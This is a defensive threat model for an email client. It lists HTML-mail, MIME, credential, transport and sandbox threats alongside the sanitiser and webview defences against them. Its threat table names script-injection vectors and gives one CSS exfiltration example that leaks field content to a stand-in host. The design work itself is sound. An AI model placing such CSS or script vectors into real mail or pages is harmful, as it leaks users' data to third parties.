# Security and threat model

Every byte that arrives over IMAP was written by someone else, possibly with
intent. This document lists what we defend against, how, and what we do not
defend against. Code that touches mail content must be reviewed against it.

## 1. Assets

- The user's mail content and metadata (confidentiality, integrity).
- Credentials: passwords, OAuth2 refresh/access tokens.
- The user's identity as a sender (no unauthorised sending).
- The local machine: no code execution, no file exfiltration.
- The user's privacy: no unrequested network requests triggered by mail.

## 2. Attackers

- **Mail sender**: anyone can send a crafted message. Full control over
  headers, MIME structure, bodies, attachment names.
- **Mail server / network**: a compromised or hostile IMAP/SMTP server, or an
  on-path attacker if TLS is misconfigured. Controls every protocol byte.
- **Local unprivileged process** (limited scope): another app in the same
  user session. Flatpak reduces, but does not remove, this.

Out of scope: a compromised user account on the machine, a compromised OS,
physical access to an unlocked session, and endpoint malware.

## 3. HTML mail

### 3.1 Threats

| Threat | Vector | Consequence |
|---|---|---|
| Script execution | `<script>`, `on*=`, `javascript:` URLs, SVG scripting, `<object>`/`<embed>` | full compromise of the rendering context |
| Tracking pixels | remote `<img>`, CSS `url()`, `@import`, `@font-face`, `<link>`, `srcset`, `<video poster>` | confirms address is live, leaks IP, time, client, sometimes read-receipts of forwarded mail |
| CSS exfiltration | attribute selectors + `url()` (`input[value^="a"] { background: url(https://x/a) }`), `@font-face` unicode-range | leak of page content character by character |
| Content spoofing / overlay | `position: fixed/absolute` overlays, z-index tricks, hidden text, `<form>` with our styling | phishing that looks like client UI |
| Masked links | link text ≠ href, IDN homographs, `data:` and `blob:` URLs | phishing |
| Frame / navigation | `<iframe>`, `<meta http-equiv=refresh>`, `<base href>` | loading arbitrary origins, rewriting relative links |
| Resource exhaustion | deeply nested tags, huge documents, billion-laughs-style entity tricks, giant images | UI hang, memory exhaustion |
| Mixed-content reference | `cid:` pointing to non-existent or foreign parts | confusion, occasional parser bugs |

### 3.2 Defences

Layer 1 — **backend sanitiser** (`backend/internal/sanitize`), the primary
defence. Requirements are listed in that package's documentation; summary:

- parse to a tree (`golang.org/x/net/html` family), never regex the source;
  re-serialise from the tree;
- element allow-list (text formatting, lists, tables, images, links,
  `<div>/<span>`, basic structure); everything else dropped with children
  kept or dropped depending on the element;
- attribute allow-list per element; all `on*` removed; URL-valued attributes
  parsed and restricted (`http`, `https`, `mailto`, `cid`); anything else
  removed and counted;
- remote references removed under the default `block` policy, `https:`
  images kept only under an explicit per-call `allow`;
- CSS (both `<style>` and `style=""`) parsed and re-emitted through a
  property allow-list; `url()`, `expression()`, `@import`, `@font-face`,
  `position: fixed|absolute` (outside the message's own box), negative
  margins beyond bounds, and `content:` are removed;
- links: only `http(s)`/`mailto`; `target` removed; every link exported in
  `links[]` with its real `href` so the UI displays the destination;
  homograph-suspicious hosts flagged (later);
- `cid:` rewritten to `malachi-cid:<partId>` only for parts that exist;
- size cap on input and output, nesting-depth cap, attribute-count cap;
- a `sanitizerVersion` string returned with every body; bump on any rule
  change so cached bodies are regenerated;
- **fail closed**: any parser error or cap breach → `sanitizeFailed`, body
  withheld, plain-text alternative offered instead.

Layer 2 — **the UI webview** (later phase, WebKitGTK 6.0):

- JavaScript disabled in `WebKitSettings`; plugins, media, WebGL, WebAudio,
  local storage, databases off;
- Content-Security-Policy `default-src 'none'; img-src malachi-cid: https:
  (only when allowed); style-src 'unsafe-inline'`, set on the loaded
  document;
- a custom URI scheme handler serving `cid:` parts from the backend;
  network access for the view otherwise denied (`WebKitNetworkSession` with
  a blocking policy / `decide-policy` denial for anything not allowed);
- navigation intercepted: any link activation is cancelled, the destination
  displayed, and opened via the OpenURI portal on user confirmation;
- the view is a separate process (WebKit's process model) with a fresh
  ephemeral data manager per message;
- tested with the corpus in `backend/testdata/mime`.

Layer 2 exists so a sanitiser bug is not automatically a compromise; it is
not a reason to relax layer 1.

## 4. Message parsing (MIME)

- Parsers assume malformed input: missing boundaries, wrong `Content-Length`,
  8-bit in 7-bit parts, nested `message/rfc822` bombs, hundreds of
  alternative parts, invalid charsets, header injection with bare CR/LF.
- Caps on: part count, nesting depth, header count and size, decoded size.
- Attachment filenames are sanitised (no `/`, `\`, control chars, leading
  dots, over-long names) and shown with their detected type, not only the
  claimed one. Executable types are never opened directly.
- Charset decoding is best-effort with replacement characters; never a
  crash, never a hang.
- Every new parser gets pathological samples in `testdata/mime` and a fuzz
  target.

## 5. Signatures and encryption (EFAIL and friends)

Not implemented in phase 1. When PGP/S/MIME arrives:

- Decrypt/verify only in the backend; the UI sees a verdict and sanitised
  content.
- **EFAIL direct-exfiltration**: never render a message where encrypted
  and unencrypted MIME parts are mixed into one HTML document. Each
  encrypted part is rendered alone, and remote content is *always* blocked
  in decrypted content regardless of the user's `allow` policy.
- **EFAIL malleability gadgets**: require MDC/AEAD for OpenPGP; refuse to
  show content whose integrity check failed, no "show anyway" button.
- Signature verdicts are displayed with the signer's *verified* identity, not
  the `From` header text; a valid signature by the wrong key is shown as a
  warning, not a checkmark.

## 6. Credentials

- Passwords and OAuth2 refresh tokens go to the system keyring through
  `org.freedesktop.secrets` (libsecret). **Never** to `config.toml`, the
  SQLite store, logs, or crash reports.
- Access tokens are held in memory only.
- OAuth2 uses the authorization-code flow with PKCE; the redirect listener
  binds `127.0.0.1` on an ephemeral port, accepts one callback with the
  expected `state`, then closes. The UI opens the URL via the OpenURI
  portal; the backend never launches a browser.
- Log lines are scrubbed: authentication commands are logged as
  `AUTHENTICATE <redacted>`.
- `account.list` never returns secrets; `Credentials` is write-only.
- If the keyring is unavailable, the account goes to `authRequired`; we do
  not fall back to plaintext storage.

## 7. Transport

- TLS by default (implicit TLS or STARTTLS with mandatory upgrade).
  `security: none` is accepted only for `localhost` and is meant for tests.
- System CA store; certificate errors are fatal for the connection, with a
  clear `tlsError` in `notify.syncState`. No "ignore certificate" option in
  phase 1; if one is ever added it is per-account, per-fingerprint, and
  loud.
- Minimum TLS 1.2.
- Server-supplied strings (capabilities, folder names, error text) are
  treated as untrusted display data.

## 8. Local storage

- `store.db` is `0600` in a `0700` directory. Mail is stored unencrypted at
  rest; full-disk encryption is the user's responsibility and is stated in
  the README.
- The RPC socket is `0600`; any process running as the user can talk to the
  daemon. That is the same trust level as reading `store.db` directly, so
  no additional authentication is layered on the socket.
- Temporary files for attachments go into `$XDG_RUNTIME_DIR` or
  `$XDG_CACHE_HOME/malachi`, `0600`, removed after use.

## 9. Sandbox: what Flatpak gives and what it does not

Gives:

- filesystem isolation: the app sees only its own data dirs; attachments
  are opened/saved through the FileChooser portal, so a mail cannot make
  us read `~/.ssh`;
- no direct D-Bus access except the names listed in `finish-args`
  (`org.freedesktop.secrets`, `org.freedesktop.Notifications`);
- WebKitGTK's own process sandbox (bubblewrap) works inside Flatpak;
- a defined runtime, so library versions are known.

Does not give:

- protection against the app itself being malicious or buggy in what it
  *is* allowed to do: with `--share=network` a compromised renderer can
  still make network requests — hence layers 1 and 2 above, not the
  sandbox, are what prevent tracking and exfiltration;
- isolation between the UI and the daemon: they share one sandbox
  instance; a compromise of either is a compromise of both. This is
  accepted; the two-process split is about architecture and crash
  isolation, not privilege separation;
- protection of the keyring: `org.freedesktop.secrets` access is
  all-or-nothing; we can read other apps' secrets and they can read ours.
  A future portal-based secrets API would improve this;
- protection against a malicious X11 server (`--socket=fallback-x11`):
  under X11 any client can snoop input. Wayland is the supported path.

## 10. Reporting

Security issues: open a private report on the GitHub repository (Security →
Advisories) rather than a public issue. No bug bounty.

## 11. Review checklist for PRs touching content handling

- [ ] Does any path return HTML that did not pass `internal/sanitize`?
- [ ] New parser: are there malformed samples in `testdata/mime` and a
      fuzz target?
- [ ] New URL handling: is the scheme allow-listed, is the real target
      shown?
- [ ] New network request: is it triggered by user action, not by content?
- [ ] New log line: can it contain a secret or message content?
- [ ] New `finish-args` entry: is there a portal instead?
